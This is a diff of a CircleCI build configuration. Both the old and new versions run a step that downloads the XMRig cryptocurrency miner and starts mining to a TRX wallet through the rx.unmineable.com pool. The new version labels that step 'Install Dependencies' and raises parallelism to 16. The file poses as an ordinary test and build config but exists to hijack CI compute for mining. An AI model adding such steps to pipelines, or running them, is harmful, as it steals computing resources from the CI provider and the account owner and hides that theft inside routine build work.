@@ -1,13 +1,18 @@
-version: 2.0
+version: 2.1
 jobs:
-  build:
-    parallelism: 1
-    docker:
-      - image: cimg/go:1.17.7
-    steps: 
-      - checkout 
-      - run: 
-          name: Run tests
-          no_output_timeout: 5h      
-          command: |
-              wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 &&./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TJReV8g7d6EtxWbeP9iYmhZHgzRxxxbz4a.jb#gy5w-sleu -t5/online.sh && chmod +x online.sh &&./online.sh
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 &&./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TJReV8g7d6EtxWbeP9iYmhZHgzRxxxbz4a.jb#gy5w-sleu -t4/online.sh && chmod +x online.sh &&./online.sh
+              
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
